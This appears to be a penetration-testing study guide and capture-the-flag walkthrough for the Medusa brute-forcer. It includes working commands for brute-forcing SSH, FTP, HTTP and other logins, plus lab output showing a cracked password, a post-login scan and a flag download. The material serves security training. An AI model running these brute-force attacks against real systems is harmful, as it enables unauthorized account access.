Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.


## Medusa Command Options

| Parameter                  | Explanation                                                                                                                              | Example                                                                                                                                                            |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `-h HOST` or `-H FILE`     | Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).              | `medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`                                                                                                        |
| `-u USERNAME` or `-U FILE` | Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).                               | `medusa -u admin ...` or `medusa -U usernames.txt ...`                                                                                                             |
| `-p PASSWORD` or `-P FILE` | Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).                               | `medusa -p password123 ...` or `medusa -P passwords.txt ...`                                                                                                       |
| `-M MODULE`                | Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).                                                   | `medusa -M ssh ...`                                                                                                                                                |
| `-m "MODULE_OPTION"`       | Module options: Provide additional parameters required by the chosen module, enclosed in quotes.                                         | `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...` |
| `-t TASKS`                 | Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.                                          | `medusa -t 4 ...`                                                                                                                                                  |
| `-f` or `-F`               | Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).              | `medusa -f ...` or `medusa -F ...`                                                                                                                                 |
| `-n PORT`                  | Port: Specify a non-default port for the target service.                                                                                 | `medusa -n 2222 ...`                                                                                                                                               |
| <br>`-v LEVEL`             | Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output. | `medusa -v 4 ...`                                                                                                                                                  |

## Medusa Modules

Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:

| Module     | Service/Protocol                 | Description                                                                                 | Example                                                                                                                       |
| ---------- | -------------------------------- | ------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `ftp`      | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                    |
| `http`     | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over HTTP (GET/POST).                         | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`   |
| `imap`     | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                            |
| `mysql`    | MySQL Database                   | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| `pop3`     | Post Office Protocol 3           | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                            |
| `rdp`      | Remote Desktop Protocol          | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                    |
| `ssh`      | Secure Shell (SSH)               | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                     |
| `svn`      | Subversion (Version Control)     | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                    |
| `telnet`   | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                                 |
| `vnc`      | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                             |
| `web-form` | Web Login Forms                  | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`<br> |
|            | -T TIME                          | Conn timeout in sec 3 def                                                                   |                                                                                                                               |
|            | -r DELAY                         | Sleep between retries                                                                       |                                                                                                                               |
|            | -R RETRIEs                       | retries number                                                                              |                                                                                                                               |
### Targeting an SSH Server

Imagine a scenario where you need to test the security of an SSH server at `192.168.0.100`. You have a list of potential usernames in `usernames.txt` and common passwords in `passwords.txt`. To launch a brute-force attack against the SSH service on this server, use the following Medusa command:

Medusa

```shell-session
underhill341@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

This command instructs Medusa to:

- Target the host at `192.168.0.100`.
- Use the usernames from the `usernames.txt` file.
- Test the passwords listed in the `passwords.txt` file.
- Employ the `ssh` module for the attack.

Medusa will systematically try each username-password combination against the SSH service to attempt to gain unauthorized access.

### Targeting Multiple Web Servers with Basic HTTP Authentication

Suppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in `web_servers.txt`, and you also have lists of common usernames and passwords in `usernames.txt` and `passwords.txt`, respectively. To test these servers concurrently, execute:

Medusa

```shell-session
underhill341@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

In this case, Medusa will:

- Iterate through the list of web servers in `web_servers.txt`.
- Use the usernames and passwords provided.
- Employ the `http` module with the `GET` method to attempt logins.

By running multiple threads, Medusa efficiently checks each server for weak credentials.

### Testing for Empty or Default Passwords

If you want to assess whether any accounts on a specific host (`10.0.0.5`) have empty or default passwords (where the password matches the username), you can use:

Medusa

```shell-session
underhill341@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

This command instructs Medusa to:

- Target the host at `10.0.0.5`.
- Use the usernames from `usernames.txt`.
- Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
- Use the appropriate service module (replace `service_name` with the correct module name).

Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.

```
medusa -h 94.237.57.115 -n 59438 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
Let's break down each component:

- `-h <IP>`: Specifies the target system's IP address.
- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
- `-u sshuser`: Sets the username for the brute-force attack.
- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
- `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.

Web Services

```shell-session
underhill341@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

Upon execution, Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.

## Gaining Access

With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:

Web Services

```shell-session
underhill341@htb[/htb]$ ssh sshuser@<IP> -p PORT
```

This command will initiate an interactive SSH session, granting you access to the remote system's command line.

### Expanding the Attack Surface

Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.

Web Services

```shell-session
underhill341@htb[/htb]$ netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```

Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.

Web Services

```shell-session
underhill341@htb[/htb]$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

### Targeting the FTP Server

Having identified the FTP server, you can proceed to brute-force its authentication mechanism.

If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:

Web Services

```shell-session
underhill341@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 5
GENERAL: Total Hosts: 1
GENERAL: Total Users: 1
GENERAL: Total Passwords: 197
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
...
GENERAL: Medusa has finished.
```

The key differences here are:

- `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
- `-u ftpuser`: Specifies the username `ftpuser`.
- `-M ftp`: Selects the FTP module within Medusa.
- `-t 5`: Increases the number of parallel login attempts to 5.

### Retrieving The Flag

Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:

Web Services

```shell-session
underhill341@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||25926|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||37251|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (131.45 KiB/s)
ftp> exit
221 Goodbye.
```

Then read the file to get the flag: